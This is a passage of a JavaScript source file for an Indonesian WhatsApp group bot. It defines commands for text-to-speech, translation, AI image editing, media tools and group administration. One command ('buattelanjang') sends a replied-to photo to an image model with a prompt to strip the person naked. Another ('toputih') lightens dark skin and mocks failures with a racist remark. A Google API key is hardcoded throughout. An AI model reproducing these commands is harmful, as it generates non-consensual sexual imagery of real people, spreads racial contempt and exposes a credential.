          if (!text) return m.reply(`Masukan Text`);
          m.reply(mess.wait);
          try {
            let anu = `https://api.siputzx.my.id/api/tools/tts?text=${encodeURIComponent(
              text
            )}&voice=jv-ID-DimasNeural&rate=0%&pitch=0Hz&volume=0%`;
            const response = await axios.get(anu, {
              responseType: "arraybuffer",
            });
            let buffer = response.data;

            Kilianhst.sendMessage(m.chat, {
              audio: buffer,
              mimetype: "audio/mpeg",
              ptt: true,
            });
          } catch (err) {
            console.log(err);
            return err;
          }
        }
        break;
      case "tts2":
        {
          if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              }
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          Kilianhst.sendMessage(m?.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          });
        }
        break;
      case "pastebin":
      case "getpastebin":
        {
          if (!q) return m.reply("Mana Link Pastebinnya");
          try {
            const anu = await axios.get(
              `https://api.hiuraa.my.id/tools/getpastebin?url=${encodeURIComponent(
                q
              )}`
            );
            m.reply(anu.data.result.content);
          } catch (err) {
            m.reply("Terjadi Kesalahan: " + err);
          }
        }
        break;
      case "tr":
      case "translate":
        {
          let language;
          let teks;
          let defaultLang = "en";
          if (text || m.quoted) {
            let translate = require("translate-google-api");
            if (text && !m.quoted) {
              if (args.length < 2) return m.reply(example("id good night"));
              language = args[0];
              teks = text.split(" ").slice(1).join(" ");
            } else if (m.quoted) {
              if (!text) return m.reply(example("id good night"));
              if (args.length < 1) return m.reply(example("id good night"));
              if (!m.quoted.text) return m.reply(example("id good night"));
              language = args[0];
              teks = m.quoted.text;
            }
            let result;
            try {
              result = await translate(`${teks}`, { to: language });
            } catch (e) {
              result = await translate(`${teks}`, { to: defaultLang });
            } finally {
              m.reply(result[0]);
            }
          } else {
            return m.reply(example("id good night"));
          }
        }
        break;
      case "hijabkan":
      case "tohijab":
        {
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || "";
          let defaultPrompt =
            "Buatkan Karakter Yang Ada Di Gambar Tersebut Agar Diberikan Hijab Warna Putih Hijab Ala Orang Indonesia Dan Jangan Sampai Rambutnya Terlihat, Semua Tertutup";
          if (!mime) {
            m.reply("Tidak ada gambar yang direply, membuat gambar default...");
            mime = "image/png";
            q = {
              msg: { mimetype: mime },
              download: async () => fs.readFileSync("default_image.png"),
            };
          }
          if (!/image\/(jpe?g|png)/.test(mime))
            return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
          let promptText = text || defaultPrompt;
          m.reply("Otw Di Hijabkan...");
          try {
            let imgData = await q.download();
            let genAI = new GoogleGenerativeAI(
              "AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI"
            );
            const base64Image = imgData.toString("base64");
            const contents = [
              { text: promptText },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image,
                },
              },
            ];
            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"],
              },
            });
            const response = await model.generateContent(contents);
            let resultImage;
            let resultText = "";
            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }
            if (resultImage) {
              const tmpDir = path.join(process.cwd(), "tmp");
              if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
              }
              let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
              fs.writeFileSync(tempPath, resultImage);
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: tempPath },
                  caption: `*tuh*`,
                },
                { quoted: m }
              );
              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch (err) {
                  console.error("Failed to delete temp file:", err);
                }
              }, 30000);
            } else {
              m.reply("Gagal Di Hijabkan Dosa Nya Ke gedean Ini Mah.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break;
      case "aiedit":
      case "editai":
        {
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || "";
          if (!text) {
            return m.reply(
              "Harap masukkan prompt custom!\n\nContoh: aiedit buatkan foto itu lebih estetik."
            );
          }
          if (!mime) {
            return m.reply(
              "Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png."
            );
          }
          if (!/image\/(jpe?g|png)/.test(mime)) {
            return m.reply(
              `Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`
            );
          }
          m.reply("Otw diedit sesuai permintaan...");
          try {
            let imgData = await q.download();
            let genAI = new GoogleGenerativeAI(
              "AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI"
            );
            const base64Image = imgData.toString("base64");
            const contents = [
              { text: text },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image,
                },
              },
            ];
            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"],
              },
            });
            const response = await model.generateContent(contents);
            let resultImage;
            let resultText = "";
            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }
            if (resultImage) {
              const tmpDir = path.join(process.cwd(), "tmp");
              if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
              }
              let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
              fs.writeFileSync(tempPath, resultImage);
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: tempPath },
                  caption: `*Edit selesai sesuai permintaan!*`,
                },
                { quoted: m }
              );

              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch (err) {
                  console.error("Gagal menghapus file sementara:", err);
                }
              }, 30000);
            } else {
              m.reply("Gagal memproses gambar.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break;
      case "buatputih":
      case "putihkan":
      case "toputih":
        {
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || "";
          let defaultPrompt =
            "Buatlah kulit yang berwarna hitam itu menjadi warna kulit seperti biasanya";
          if (!mime) {
            m.reply("Tidak ada gambar yang direply, membuat gambar default...");
            mime = "image/png";
            q = {
              msg: { mimetype: mime },
              download: async () => fs.readFileSync("default_image.png"),
            };
          }
          if (!/image\/(jpe?g|png)/.test(mime))
            return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
          let promptText = text || defaultPrompt;
          m.reply("Otw...");
          try {
            let imgData = await q.download();
            let genAI = new GoogleGenerativeAI(
              "AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI"
            );
            const base64Image = imgData.toString("base64");
            const contents = [
              { text: promptText },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image,
                },
              },
            ];
            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"],
              },
            });
            const response = await model.generateContent(contents);
            let resultImage;
            let resultText = "";
            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }
            if (resultImage) {
              const tmpDir = path.join(process.cwd(), "tmp");
              if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
              }
              let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
              fs.writeFileSync(tempPath, resultImage);
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: tempPath },
                  caption: `*tuh*`,
                },
                { quoted: m }
              );
              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch (err) {
                  console.error("Failed to delete temp file:", err);
                }
              }, 30000);
            } else {
              m.reply("Maaf Itu Udh Terlalu Itam.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break;
      case "tourl":
        {
          if (!/image/.test(mime))
            return reply("Kirim/Reply Foto Yang Mau Diubah Jadi Url");
          let media = await Kilianhst.downloadAndSaveMediaMessage(qmsg);
          const { ImageUploadService } = require("node-upload-images");
          const service = new ImageUploadService("pixhost.to");
          let { directLink } = await service.uploadFromBinary(
            fs.readFileSync(media),
            "6726.png"
          );
          let teks = `*LINK IMAGE ANDA*\n\n${yy1}Links:${yy1} ${directLink}\n${yy1}Expired:${yy1} Tidak Ada Waktu Expired`;
          await Kilianhst.sendMessage(m.chat, { text: teks }, { quoted: m });
          fs.unlinkSync(media);
        }
        break;
      case "telanjangij":
      case "lepassemua":
      case "buattelanjang":
        {
          let q = m.quoted ? m.quoted : m;
          let mime = (q.msg || q).mimetype || "";
          let defaultPrompt =
            "Lepaskan semua pakaiannya atau lebih tepatnya tanpa busana";
          if (!mime) {
            m.reply("Tidak ada gambar yang direply, membuat gambar default...");
            mime = "image/png";
            q = {
              msg: { mimetype: mime },
              download: async () => fs.readFileSync("default_image.png"),
            };
          }
          if (!/image\/(jpe?g|png)/.test(mime))
            return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
          let promptText = text || defaultPrompt;
          m.reply("Otw...");
          try {
            let imgData = await q.download();
            let genAI = new GoogleGenerativeAI(
              "AIzaSyDWxXKqqaz3Ypv7rW2j9Fhn2TNYazTOUCI"
            );
            const base64Image = imgData.toString("base64");
            const contents = [
              { text: promptText },
              {
                inlineData: {
                  mimeType: mime,
                  data: base64Image,
                },
              },
            ];
            const model = genAI.getGenerativeModel({
              model: "gemini-2.0-flash-exp-image-generation",
              generationConfig: {
                responseModalities: ["Text", "Image"],
              },
            });
            const response = await model.generateContent(contents);
            let resultImage;
            let resultText = "";
            for (const part of response.response.candidates[0].content.parts) {
              if (part.text) {
                resultText += part.text;
              } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
              }
            }
            if (resultImage) {
              const tmpDir = path.join(process.cwd(), "tmp");
              if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
              }
              let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
              fs.writeFileSync(tempPath, resultImage);
              await Kilianhst.sendMessage(
                m.chat,
                {
                  image: { url: tempPath },
                  caption: `*tuh*`,
                },
                { quoted: m }
              );
              setTimeout(() => {
                try {
                  fs.unlinkSync(tempPath);
                } catch (err) {
                  console.error("Failed to delete temp file:", err);
                }
              }, 30000);
            } else {
              m.reply("Sangek Bgt jink.");
            }
          } catch (error) {
            console.error(error);
            m.reply(`Error: ${error.message}`);
          }
        }
        break;
      case "rvo":
      case "toviewonce":
        {
          if (!quoted) return reply(`Reply Image/Video`);
          if (/image/.test(mime)) {
            anuan = await Kilianhst.downloadAndSaveMediaMessage(quoted);
            Kilianhst.sendMessage(
              m.chat,
              {
                image: { url: anuan },
                caption: `Ini dia!!`,
                fileLength: "999",
                viewOnce: true,
              },
              { quoted: m }
            );
          } else if (/video/.test(mime)) {
            anuanuan = await Kilianhst.downloadAndSaveMediaMessage(quoted);
            Kilianhst.sendMessage(
              m.chat,
              {
                video: { url: anuanuan },
                caption: `Ini dia!!`,
                fileLength: "99999999",
                viewOnce: true,
              },
              { quoted: m }
            );
          } else if (/audio/.test(mime)) {
            anuu = await Kilianhst.downloadAndSaveMediaMessage(quoted);
            return Kilianhst.sendMessage(
              m.chat,
              {
                audio: { url: anuu },
                caption: `Ini dia!!`,
                fileLength: "99999999",
                viewOnce: true,
              },
              { quoted: m }
            );
          }
        }
        break;
      case "hd":
      case "hdr":
      case "remini":
        {
          let media = await quoted.download();
          let proses = await remini(media, "enhance");
          Kilianhst.sendMessage(
            m.chat,
            { image: proses, caption: "Berhasil" },
            { quoted: m }
          );
        }
        break;
      case "hdvid":
        {
          const quoted = m.quoted ? m.quoted : m;
          const mime = (quoted.msg || quoted).mimetype || "";
          if (!m.quoted || !/video/.test(mime)) {
            await Kilianhst.sendMessage(
              m.chat,
              { text: "Tolong kirimkan video yang ingin diubah." },
              { quoted: m }
            );
            return;
          }

          reply("Waiting..");

          try {
            const { VideoHD } = require("./system/Scrape/hdvid.js");
            const media = await m.quoted.download();
            const videoPath = path.join(__dirname, "video.mp4");
            const outputPath = path.join(__dirname, "output.mp4");

            fs.writeFileSync(videoPath, media);

            await VideoHD(videoPath, outputPath, async (err, videoPath) => {
              if (err) {
                await Kilianhst.sendMessage(
                  m.chat,
                  { text: "Terjadi kesalahan saat mengubah video." },
                  { quoted: m }
                );
                return;
              }

              await Kilianhst.sendMessage(
                m.chat,
                {
                  video: { url: videoPath },
                  caption: "Ini adalah video yang telah diubah menjadi HD.",
                },
                { quoted: m }
              );

              fs.unlink(videoPath, (err) => {
                if (err) {
                  console.error(
                    "Terjadi kesalahan saat menghapus video input:",
                    err.message
                  );
                } else {
                  console.log("File video input berhasil dihapus.");
                }
              });
              fs.unlink(outputPath, (err) => {
                if (err) {
                  console.error(
                    "Terjadi kesalahan saat menghapus video output:",
                    err.message
                  );
                } else {
                  console.log("File output berhasil dihapus.");
                }
              });
            });
          } catch (error) {
            console.error(
              "Terjadi kesalahan saat mengunduh video:",
              error.message
            );
            await Kilianhst.sendMessage(
              m.chat,
              { text: "Terjadi kesalahan saat mengunduh video." },
              { quoted: m }
            );
          }
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗚 𝗥 𝗢 𝗨 𝗣     -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "closetime":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (args[1] == "detik") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "menit") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "jam") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "hari") {
          var timer = args[0] * `86400000`;
        } else {
          return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik");
        }
        m.reply(`Close time ${q} dimulai dari sekarang`);
        setTimeout(() => {
          var nomor = m.participant;
          const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`;
          Kilianhst.groupSettingUpdate(m.chat, "announcement");
          m.reply(close);
        }, timer);
        break;
      case "opentime":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (args[1] == "detik") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "menit") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "jam") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "hari") {
          var timer = args[0] * `86400000`;
        } else {
          return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik");
        }
        m.reply(`Open time ${q} dimulai dari sekarang`);
        setTimeout(() => {
          var nomor = m.participant;
          const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`;
          Kilianhst.groupSettingUpdate(m.chat, "not_announcement");
          m.reply(open);
        }, timer);
        break;
      case "kick":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let blockwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Kilianhst.groupParticipantsUpdate(m.chat, [blockwww], "remove")
          .then((res) => m.reply(json(res)))
          .catch((err) => m.reply(json(err)));
        break;
      case "promote":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let blockwwwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Kilianhst.groupParticipantsUpdate(m.chat, [blockwwwww], "promote")
          .then((res) => m.reply(json(res)))
          .catch((err) => m.reply(json(err)));
        break;
      case "demote":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let blockwwwwwa = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Kilianhst.groupParticipantsUpdate(m.chat, [blockwwwwwa], "demote")
          .then((res) => m.reply(json(res)))
          .catch((err) => m.reply(json(err)));
        break;
      case "setname":
      case "setsubject":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!text) return reply(`text?`);
        await Kilianhst.groupUpdateSubject(m.chat, text)
          .then((res) => m.reply(mess.success))
          .catch((err) => m.reply(json(err)));
        break;
      case "setdesc":
      case "setdesk":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!text) return reply(`text?`);
        await Kilianhst.groupUpdateDescription(m.chat, text)
          .then((res) => m.reply(mess.success))
          .catch((err) => m.reply(json(err)));
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!quoted)
          return m.reply(
            `Kirim/m.reply Image Dengan Caption ${prefix + command}`
          );
        if (!/image/.test(mime))
          return m.reply(
            `Kirim/m.reply Image Dengan Caption ${prefix + command}`
          );
        if (/webp/.test(mime))
          return m.reply(
            `Kirim/m.reply Image Dengan Caption ${prefix + command}`
          );
        var medis = await Kilianhst.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await Kilianhst.query({
            tag: "iq",
            attrs: {
              to: m.chat,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          m.reply(mess.done);
        } else {
          var memeg = await Kilianhst.updateProfilePicture(m.chat, {
            url: medis,
          });
          fs.unlinkSync(medis);
          m.reply(mess.done);
        }
        break;
      case "tagall":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let teks = `ダ TAG BY ADMIN ダ
 
                  *MESSAGE: ${q ? q : "kosong"}*\n\n`;
        for (let mem of participants) {
          teks += `◈ @${mem.id.split("@")[0]}\n`;
        }
        Kilianhst.sendMessage(
          m.chat,
          {
            text: teks,
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
      case "hidetag":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        Kilianhst.sendMessage(
          m.chat,
          {
            text: q ? q : "",
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
      case "totag":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (!m.quoted)
          return m.reply(`Reply pesan dengan caption ${prefix + command}`);
        Kilianhst.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
        break;
      case "group":
      case "grup":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        if (args[0] === "close") {
          await Kilianhst.groupSettingUpdate(m.chat, "announcement")
            .then((res) => m.reply(`Sukses Menutup Group 🕊️`))
            .catch((err) => m.reply(json(err)));
        } else if (args[0] === "open") {
          await Kilianhst.groupSettingUpdate(m.chat, "not_announcement")
            .then((res) => m.reply(`Sukses Membuka Group 🕊️`))
            .catch((err) => m.reply(json(err)));
        } else {
          m.reply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`);
        }
        break;
      case "linkgroup":
      case "linkgrup":
      case "linkgc":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        let response = await Kilianhst.groupInviteCode(m.chat);
        Kilianhst.sendText(
          m.chat,
          `👥 *INFO LINK GROUP*\n📛 *Nama :* ${
            groupMetadata.subject
          }\n👤 *Owner Grup :* ${
            groupMetadata.owner !== undefined
              ? "@" + groupMetadata.owner.split`@`[0]
              : "Tidak diketahui"
          }\n🌱 *ID :* ${
            groupMetadata.id
          }\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${
            groupMetadata.participants.length
          }\n`,
          m,
          {
            detectLink: true,
          }
        );
        break;
      case "revoke":
      case "resetlink":
        if (!m.isGroup) return m.reply(mess.OnlyGrup);
        if (!isAdmins && !isCreator) return m.reply(mess.admins);
        if (!isBotAdmins) return m.reply(mess.botAdmin);
        await Kilianhst.groupRevokeInvite(m.chat)
          .then((res) => {
            m.reply(
              `Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`
            );
          })
          .catch((err) => m.reply(json(err)));
        break;
      case "welcome":
        {
          if (!isCreator) return m.reply("*khusus Premium*");
          if (!m.isGroup) return m.reply("Buat Di Group Bodoh");
          if (args.length < 1)
            return m.reply(
              "ketik on untuk mengaktifkan\nketik off untuk menonaktifkan"
            );
          if (args[0] === "on") {
            if (welcm) return m.reply("Sudah Aktif");
            wlcm.push(from);
            var groupe = await Kilianhst.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              from,
              {
                text: `Fitur Welcome Di Aktifkan Di Group Ini`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!welcm) return m.reply("Sudah Non Aktif");
            let off = wlcm.indexOf(from);
            wlcm.splice(off, 1);
            m.reply("Sukses Mematikan Welcome  di group ini");
          }
        }
        break;
      case "antivirus":
      case "antivirtex":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiVirtex) return reply("_Sudah Diaktifkan_");
            ntvirtex.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antivirus.json",
              JSON.stringify(ntvirtex)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiVirtex) return reply("_Sudah Dimatikan_");
            let off = ntvirtex.indexOf(m.chat);
            ntvirtex.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antivirus.json",
              JSON.stringify(ntvirtex)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinkyoutubevideo":
      case "antilinkyoutubevid":
      case "antilinkytvid":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkYoutubeVid) return reply("_Sudah Diaktifkan_");
            ntilinkytvid.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkytvideo.json",
              JSON.stringify(ntilinkytvid)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkYoutubeVid) return reply("_Sudah Dimatikan_");
            let off = ntilinkytvid.indexOf(m.chat);
            ntilinkytvid.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkytvideo.json",
              JSON.stringify(ntilinkytvid)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinkyoutubech":
      case "antilinkyoutubechannel":
      case "antilinkytch":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkYoutubeChannel) return reply("_Sudah Diaktifkan_");
            ntilinkytch.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkytchannel.json",
              JSON.stringify(ntilinkytch)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkYoutubeChannel) return reply("_Sudah Dimatikan_");
            let off = ntilinkytch.indexOf(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkytchannel.json",
              JSON.stringify(ntilinkytch)
            );
            ntilinkytch.splice(off, 1);
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinkinstagram":
      case "antilinkig":
      case "antilinkinsta":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
            if (AntiLinkInstagram) return reply("_Sudah Diaktifkan_");
            ntilinkig.push(m.chat);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkinstagram.json",
              JSON.stringify(ntilinkig)
            );
            reply(`_Sukses aktifkan ${command} di group ini_`);
            var groupe = await Kilianhst.groupMetadata(m.chat);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Kilianhst.sendMessage(
              m.chat,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiLinkInstagram) return reply("_Sudah Dimatikan_");
            let off = ntilinkig.indexOf(m.chat);
            ntilinkig.splice(off, 1);
            fs.writeFileSync(
              "./system/Database/Antilink/antilinkinstagram.json",
              JSON.stringify(ntilinkig)
            );
            reply(`_Sukses matikan ${command} di group ini_`);
          } else {
            reply("on untuk mengaktifkan, off untuk menonaktifkan");
          }
        }
        break;

      case "antilinkfacebook":
      case "antilinkfb":
        {
          if (!m.isGroup) return reply(`Khusus Grub Geblek`);
          if (!isBotAdmins) return reply("Bot Bukan Admin Geblek");
          if (!isAdmins && !isCreator)
            return reply("Khusus Admin Sayaaaang ><");
          if (args[0] === "on") {
